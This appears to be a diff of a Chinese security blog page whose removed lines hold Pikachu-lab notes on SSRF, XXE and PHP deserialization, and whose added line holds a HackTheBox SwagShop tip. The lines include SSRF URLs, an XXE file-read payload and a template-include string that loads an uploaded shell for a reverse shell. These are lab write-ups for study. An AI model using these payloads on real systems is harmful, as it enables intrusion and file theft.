-</div><hr style="height:1px;margin:1rem 0"><div class="level is-mobile is-flex"><div class="article-tags is-size-7 is-uppercase"><i class="fas fa-tags has-text-grey"></i> <a class="link-muted" rel="tag" href="/tags/google/">google, </a><a class="link-muted" rel="tag" href="/tags/baidu/">baidu, </a><a class="link-muted" rel="tag" href="/tags/github/">github, </a><a class="link-muted" rel="tag" href="/tags/search-skills/">search skills </a></div></div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2021-12-21T00:45:35.000Z" title="12/21/2021, 8:45:35 AM">2021-12-21</time>发表</span><span class="level-item"><time dateTime="2021-12-21T00:45:35.000Z" title="12/21/2021, 8:45:35 AM">2021-12-21</time>更新</span><span class="level-item"><a class="link-muted" href="/categories/penetration-Test/">penetration Test</a><span> / </span><a class="link-muted" href="/categories/penetration-Test/train/">train</a></span><span class="level-item">2 分钟读完 (大约236个字)</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/something-about-Pikachu-SSRF/">something about Pikachu - SSRF</a></h1><div class="content"><h1 id="pikachu"><a href="#pikachu" class="headerlink" title="pikachu"></a>pikachu</h1><p><a target="_blank" rel="noopener" href="https://github.com/zhuifengshaonianhanlu/pikachu">pikachu</a>    =&gt; <a target="_blank" rel="noopener" href="https://github.com/to-be-the-one/pikachu">备份地址</a></p>
-<h2 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h2><h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>SSRF(Server-Side Request Forgery:服务器端请求伪造)。主要由于服务端提供了从其他服务器应用获取数据
-的功能，但又未对目标地址做严格的限制，导致攻击者可以传入恶意地址。服务器对恶意地址进行请求，
-返回恶意内容后造成损失。</p>
-<p>PHP后台对目标地址请求的函数主要有:</p>
-<ul>
-<li><p>file_get_contents()</p>
-</li>
-<li><p>fsockopen()</p>
-</li>
-<li><p>curl_exec()</p>
-</li>
-</ul>
-<h3 id="SSRF-curl"><a href="#SSRF-curl" class="headerlink" title="SSRF(curl)"></a>SSRF(curl)</h3><p>在url中拼接对应的恶意地址即可。</p>
-<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://train.com/pikachu/vul/ssrf/ssrf_curl.php?url=http://bad.com/</span><br></pre></td></tr></table></figure>
-
-<h3 id="SSRF-file-get-content"><a href="#SSRF-file-get-content" class="headerlink" title="SSRF(file_get_content)"></a>SSRF(file_get_content)</h3><p>在url中拼接对应的恶意地址即可。</p>
-<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://train.com/pikachu/vul/ssrf/ssrf_fgc.php?file=http://bad.com/bad.php</span><br></pre></td></tr></table></figure>
-
-<p>也可指定目标服务器上指定文件。</p>
-<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://train.com/pikachu/vul/ssrf/ssrf_fgc.php?file=C:\Windows\System32\drivers\etc\hosts</span><br></pre></td></tr></table></figure>
-</div><hr style="height:1px;margin:1rem 0"><div class="level is-mobile is-flex"><div class="article-tags is-size-7 is-uppercase"><i class="fas fa-tags has-text-grey"></i> <a class="link-muted" rel="tag" href="/tags/pikachu/">pikachu, </a><a class="link-muted" rel="tag" href="/tags/SSRF/">SSRF </a></div></div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2021-12-17T15:09:55.000Z" title="12/17/2021, 11:09:55 PM">2021-12-17</time>发表</span><span class="level-item"><time dateTime="2021-12-17T15:09:55.000Z" title="12/17/2021, 11:09:55 PM">2021-12-17</time>更新</span><span class="level-item"><a class="link-muted" href="/categories/penetration-Test/">penetration Test</a><span> / </span><a class="link-muted" href="/categories/penetration-Test/train/">train</a></span><span class="level-item">2 分钟读完 (大约324个字)</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/something-about-Pikachu-XXE/">something about Pikachu - XXE</a></h1><div class="content"><h1 id="pikachu"><a href="#pikachu" class="headerlink" title="pikachu"></a>pikachu</h1><p><a target="_blank" rel="noopener" href="https://github.com/zhuifengshaonianhanlu/pikachu">pikachu</a>    =&gt; <a target="_blank" rel="noopener" href="https://github.com/to-be-the-one/pikachu">备份地址</a></p>
-<h2 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h2><h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>XXE(XML external entity injection)，<code>xml外部实体注入</code>。<br>
-概括就是，攻击者通过向服务器注入指定的xml实体内容，从而让服务器按照指定的配置进行执行，
-导致问题。<br>
-目前很多语言中，对应的解析xml的函数默认是禁止解析外部实体内容的，从而直接避免此漏洞。</p>
-<h3 id="XXE漏洞"><a href="#XXE漏洞" class="headerlink" title="XXE漏洞"></a>XXE漏洞</h3><p>XML用来存储数据或传输数据。<br></p>
-<p>一般定义如下:</p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 第一部分:文档声明部分 --&gt;</span></span><br><span class="line"><span class="meta">&lt;?xml version = <span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 第二部分:文档定义类型DTD --&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 文档类型为note类型 --&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 定义名为`myparam`的外部实体的值为`myValue` --&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">note</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="keyword">myparam</span> <span class="string">&quot;myValue&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 第三部分:文档元素 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span><span class="symbol">&amp;myparam;</span><span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- ... --&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>正常开发时，第一部分一般不会注意。第二部分一般使用url引入需要的<code>DTD</code>。在之前学比较老的<code>SpringMVC</code>，
-使用<code>XML</code>配置文件时，文件头就会引入<code>Spring</code>的文档定义类型，然后在<code>第三部分</code>中就可以使用对应的<code>实体(标记对)</code>。</p>
-<p>构造<code>payload</code>,访问敏感文件。</p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version = <span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">note</span> [<span class="meta">&lt;!ENTITY <span class="keyword">myparam</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///C:/Windows/System32/drivers/etc/hosts&quot;</span>&gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span><span class="symbol">&amp;myparam;</span><span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br></pre></td></tr></table></figure>
-</div><hr style="height:1px;margin:1rem 0"><div class="level is-mobile is-flex"><div class="article-tags is-size-7 is-uppercase"><i class="fas fa-tags has-text-grey"></i> <a class="link-muted" rel="tag" href="/tags/pikachu/">pikachu, </a><a class="link-muted" rel="tag" href="/tags/XXE/">XXE </a></div></div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2021-12-17T01:03:47.000Z" title="12/17/2021, 9:03:47 AM">2021-12-17</time>发表</span><span class="level-item"><time dateTime="2021-12-17T01:03:47.000Z" title="12/17/2021, 9:03:47 AM">2021-12-17</time>更新</span><span class="level-item"><a class="link-muted" href="/categories/penetration-Test/">penetration Test</a><span> / </span><a class="link-muted" href="/categories/penetration-Test/train/">train</a></span><span class="level-item">4 分钟读完 (大约539个字)</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/something-about-Pikachu-PHP-serialize/">something about Pikachu - PHP serialize</a></h1><div class="content"><h1 id="pikachu"><a href="#pikachu" class="headerlink" title="pikachu"></a>pikachu</h1><p><a target="_blank" rel="noopener" href="https://github.com/zhuifengshaonianhanlu/pikachu">pikachu</a>    =&gt; <a target="_blank" rel="noopener" href="https://github.com/to-be-the-one/pikachu">备份地址</a></p>
-<h2 id="PHP反序列化"><a href="#PHP反序列化" class="headerlink" title="PHP反序列化"></a>PHP反序列化</h2><h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>php中的<code>serialize()</code>和<code>unserialize()</code>函数，可以将一个对象转变成可传输的字符串，以及从字符串
-转换回对象。类似于<code>javascript</code>中的<code>JSON.stringify(obj)</code>和<code>JSON.parse(str)</code>函数的功能。</p>
-<p>PHP中的<code>serialize</code>规则:</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 有以下类:</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">S</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$paramA</span> = <span class="string">&quot;valueA&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$paramB</span> = <span class="string">&quot;valueB&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">funA</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;function A&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;paramA;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> <span class="title function_ invoke__">S</span>();</span><br><span class="line"><span class="variable">$objStr</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$obj</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$objStr</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 序列化后的结果为</span></span><br><span class="line"><span class="comment">// O:1:&quot;S&quot;:2:&#123;s:6:&quot;paramA&quot;;s:6:&quot;valueA&quot;;s:6:&quot;paramB&quot;;i:2;&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// O: 代表object; 1: 代表类名长度为1; &quot;S&quot;: 类名为&quot;S&quot;;</span></span><br><span class="line"><span class="comment">// 2: 代表类中有2个变量</span></span><br><span class="line"><span class="comment">// 变量一:</span></span><br><span class="line"><span class="comment">// s: 代表数据类型(变量名)为字符串; 6: 代表变量名长度为6; &quot;paramA&quot;: 代表变量名为&quot;paramA&quot;;</span></span><br><span class="line"><span class="comment">// s: 代表数据类型(变量值)为字符串; 6: 代表变量值长度为6; &quot;valueA&quot;: 代表变量值为&quot;valueA&quot;;</span></span><br><span class="line"><span class="comment">// 变量二:</span></span><br><span class="line"><span class="comment">// s: 代表数据类型(变量名)为字符串; 6: 代表变量名长度为6; &quot;paramB&quot;: 代表变量名为&quot;paramB&quot;;</span></span><br><span class="line"><span class="comment">// i: 代表数据类型(变量值)为数值型; 2: 代表变量值为2;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p><code>unserialize</code>就是<code>serialize</code>的反向操作。<br>
-<code>unserialize</code>和<code>serialize</code>本身没什么问题，但是当反序列化的内容受用户控制时，可能会造成
-不正当使用,特别是后台使用了一些魔法函数时。</p>
-<p>常见魔法函数如下:</p>
-<ul>
-<li><p>__construct()</p>
-<p>  对象被创建时被调用</p>
-</li>
-<li><p>__destruct()</p>
-<p>  对象被销毁时被调用</p>
-</li>
-<li><p>__toString()</p>
-<p>  当一个对象被当作一个字符串使用时被调用</p>
-</li>
-<li><p>__sleep()</p>
-<p>  对象在被序列化之前被调用</p>
-</li>
-<li><p>__wakeup()</p>
-<p>  当一个对象在被序列化之后被调用</p>
-</li>
-</ul>
-<p>例如上述<code>class S&#123;&#125;</code>，可以构造对应payload使其具有恶意行为。</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 此时转义符号</span></span><br><span class="line"><span class="comment">// payload 为 O:1:&quot;S&quot;:2:&#123;s:30:&quot;&lt;script&gt;alert(&#x27;bad&#x27;);&lt;/script&gt;&quot;;s:6:&quot;valueA&quot;;s:6:&quot;paramB&quot;;i:2;&#125;</span></span><br><span class="line"><span class="variable">$objStr</span> = <span class="string">&#x27;O:1:&quot;S&quot;:2:&#123;s:30:&quot;&lt;script&gt;alert(\&#x27;bad\&#x27;);&lt;/script&gt;&quot;;s:6:&quot;valueA&quot;;s:6:&quot;paramB&quot;;i:2;&#125;&#x27;</span>;</span><br><span class="line"><span class="variable">$obj</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$objStr</span>);</span><br><span class="line"><span class="comment">// 由于后序对$obj没有使用，垃圾回收时会销毁对象，因此调用`__destruct()`函数。</span></span><br><span class="line"><span class="comment">// 从而执行恶意代码</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="PHP反序列化漏洞"><a href="#PHP反序列化漏洞" class="headerlink" title="PHP反序列化漏洞"></a>PHP反序列化漏洞</h3><p>构造对应<code>对象字符串</code>:</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// payload 为 O:1:&quot;S&quot;:1:&#123;s:4:&quot;test&quot;;s:30:&quot;&lt;script&gt;alert(&#x27;bad&#x27;);&lt;/script&gt;&quot;;&#125;</span></span><br></pre></td></tr></table></figure>
-</div><hr style="height:1px;margin:1rem 0"><div class="level is-mobile is-flex"><div class="article-tags is-size-7 is-uppercase"><i class="fas fa-tags has-text-grey"></i> <a class="link-muted" rel="tag" href="/tags/pikachu/">pikachu, </a><a class="link-muted" rel="tag" href="/tags/php-serialize/">php serialize </a></div></div></article></div><nav class="pagination" role="navigation" aria-label="pagination"><div class="pagination-previous"><a href="/page/3/">上一页</a></div><div class="pagination-next"><a href="/page/5/">下一页</a></div><ul class="pagination-list is-hidden-mobile"><li><a class="pagination-link" href="/">1</a></li><li><a class="pagination-link" href="/page/2/">2</a></li><li><a class="pagination-link" href="/page/3/">3</a></li><li><a class="pagination-link is-current" href="/page/4/">4</a></li><li><a class="pagination-link" href="/page/5/">5</a></li><li><span class="pagination-ellipsis">&hellip;</span></li><li><a class="pagination-link" href="/page/11/">11</a></li></ul></nav></div><div class="column column-left is-4-tablet is-4-desktop is-3-widescreen  order-1 is-sticky"><div class="card widget" data-type="archives"><div class="card-content"><div class="menu"><h3 class="menu-label">归档</h3><ul class="menu-list"><li><a class="level is-mobile" href="/archives/2023/12/"><span class="level-start"><span class="level-item">十二月 2023</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2023/11/"><span class="level-start"><span class="level-item">十一月 2023</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2023/09/"><span class="level-start"><span class="level-item">九月 2023</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2023/08/"><span class="level-start"><span class="level-item">八月 2023</span></span><span class="level-end"><span class="level-item tag">4</span></span></a></li><li><a class="level is-mobile" href="/archives/2022/05/"><span class="level-start"><span class="level-item">五月 2022</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2022/02/"><span class="level-start"><span class="level-item">二月 2022</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile" href="/archives/2022/01/"><span class="level-start"><span class="level-item">一月 2022</span></span><span class="level-end"><span class="level-item tag">6</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/12/"><span class="level-start"><span class="level-item">十二月 2021</span></span><span class="level-end"><span class="level-item tag">19</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/11/"><span class="level-start"><span class="level-item">十一月 2021</span></span><span class="level-end"><span class="level-item tag">11</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/10/"><span class="level-start"><span class="level-item">十月 2021</span></span><span class="level-end"><span class="level-item tag">4</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/05/"><span class="level-start"><span class="level-item">五月 2021</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/03/"><span class="level-start"><span class="level-item">三月 2021</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li></ul></div></div></div><!--!--></div><!--!--></div></div></section><footer class="footer"><div class="container"><div class="level"><div class="level-start"><a class="footer-logo is-block mb-2" href="/">I wanna be the guy.</a><p class="is-size-7"><span>&copy; 2023 cyhfvg</span>  Powered by <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> &amp; <a href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank" rel="noopener">Icarus</a></p></div><div class="level-end"><div class="field has-addons"><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Creative Commons" href="https://creativecommons.org/"><i class="fab fa-creative-commons"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Attribution 4.0 International" href="https://creativecommons.org/licenses/by/4.0/"><i class="fab fa-creative-commons-by"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/cyhfvg"><i class="fab fa-github"></i></a></p></div></div></div></div></footer><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/moment@2.22.2/min/moment-with-locales.min.js"></script><script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.4/dist/clipboard.min.js" defer></script><script>moment.locale("zh-CN");</script><script>var IcarusThemeSettings = {
+<!-- vim: set tabstop=2 shiftwidth=2 textwidth=120 expandtab :  -->
+</div><hr style="height:1px;margin:1rem 0"><div class="level is-mobile is-flex"><div class="article-tags is-size-7 is-uppercase"><i class="fas fa-tags has-text-grey"></i> <a class="link-muted" rel="tag" href="/tags/HTB/">HTB, </a><a class="link-muted" rel="tag" href="/tags/ldap/">ldap </a></div></div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2022-05-19T14:51:51.000Z" title="5/19/2022, 10:51:51 PM">2022-05-19</time>发表</span><span class="level-item"><time dateTime="2022-05-19T14:51:51.000Z" title="5/19/2022, 10:51:51 PM">2022-05-19</time>更新</span><span class="level-item">1 分钟读完 (大约145个字)</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/htb-swagshop/">htb-swagshop</a></h1><div class="content"><h1 id="HTB-SwagShop"><a href="#HTB-SwagShop" class="headerlink" title="HTB-SwagShop"></a>HTB-SwagShop</h1><p><code>official htb walkthrough</code>中的exploit已经被打上补丁。</p>
+<p>参照<a target="_blank" rel="noopener" href="https://0xrick.github.io/hack-the-box/swagshop/">https://0xrick.github.io/hack-the-box/swagshop/</a>可以正常使用。</p>
+<p>为触发reverse-shell，在创建<code>Newsletter Templates</code>时，<br/>
+添加<code>&#123;&#123;block type='core/template' template='../../../../../../media/catalog/category/shell.php.png'&#125;&#125;</code>
+语句时，需要手动<code>Hide Editor</code>将代码模式调整为html，否则，会自动渲染为
+<code>&#123;&#123;&lt;code&gt;block type='core/template' template='../../../../../../media/catalog/category/shell.php.png'&lt;/code&gt;&#125;&#125;</code>。
+导致将代码当成普通文本渲染，而不是执行，无法载入上传的<code>shell.php.png</code>。</p>
+</div><hr style="height:1px;margin:1rem 0"><div class="level is-mobile is-flex"></div></article></div><nav class="pagination" role="navigation" aria-label="pagination"><div class="pagination-previous"><a href="/page/3/">上一页</a></div><div class="pagination-next"><a href="/page/5/">下一页</a></div><ul class="pagination-list is-hidden-mobile"><li><a class="pagination-link" href="/">1</a></li><li><a class="pagination-link" href="/page/2/">2</a></li><li><a class="pagination-link" href="/page/3/">3</a></li><li><a class="pagination-link is-current" href="/page/4/">4</a></li><li><a class="pagination-link" href="/page/5/">5</a></li><li><span class="pagination-ellipsis">&hellip;</span></li><li><a class="pagination-link" href="/page/26/">26</a></li></ul></nav></div><div class="column column-left is-4-tablet is-4-desktop is-3-widescreen  order-1 is-sticky"><div class="card widget" data-type="archives"><div class="card-content"><div class="menu"><h3 class="menu-label">归档</h3><ul class="menu-list"><li><a class="level is-mobile" href="/archives/2023/12/"><span class="level-start"><span class="level-item">十二月 2023</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2023/11/"><span class="level-start"><span class="level-item">十一月 2023</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2023/09/"><span class="level-start"><span class="level-item">九月 2023</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2023/08/"><span class="level-start"><span class="level-item">八月 2023</span></span><span class="level-end"><span class="level-item tag">4</span></span></a></li><li><a class="level is-mobile" href="/archives/2022/05/"><span class="level-start"><span class="level-item">五月 2022</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2022/02/"><span class="level-start"><span class="level-item">二月 2022</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile" href="/archives/2022/01/"><span class="level-start"><span class="level-item">一月 2022</span></span><span class="level-end"><span class="level-item tag">6</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/12/"><span class="level-start"><span class="level-item">十二月 2021</span></span><span class="level-end"><span class="level-item tag">19</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/11/"><span class="level-start"><span class="level-item">十一月 2021</span></span><span class="level-end"><span class="level-item tag">11</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/10/"><span class="level-start"><span class="level-item">十月 2021</span></span><span class="level-end"><span class="level-item tag">4</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/05/"><span class="level-start"><span class="level-item">五月 2021</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/03/"><span class="level-start"><span class="level-item">三月 2021</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li></ul></div></div></div><!--!--></div><!--!--></div></div></section><footer class="footer"><div class="container"><div class="level"><div class="level-start"><a class="footer-logo is-block mb-2" href="/">I wanna be the guy.</a><p class="is-size-7"><span>&copy; 2023 cyhfvg</span>  Powered by <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> &amp; <a href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank" rel="noopener">Icarus</a></p></div><div class="level-end"><div class="field has-addons"><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Creative Commons" href="https://creativecommons.org/"><i class="fab fa-creative-commons"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Attribution 4.0 International" href="https://creativecommons.org/licenses/by/4.0/"><i class="fab fa-creative-commons-by"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/cyhfvg"><i class="fab fa-github"></i></a></p></div></div></div></div></footer><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/moment@2.22.2/min/moment-with-locales.min.js"></script><script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.4/dist/clipboard.min.js" defer></script><script>moment.locale("zh-CN");</script><script>var IcarusThemeSettings = {
             article: {
                 highlight: {
                     clipboard: true,
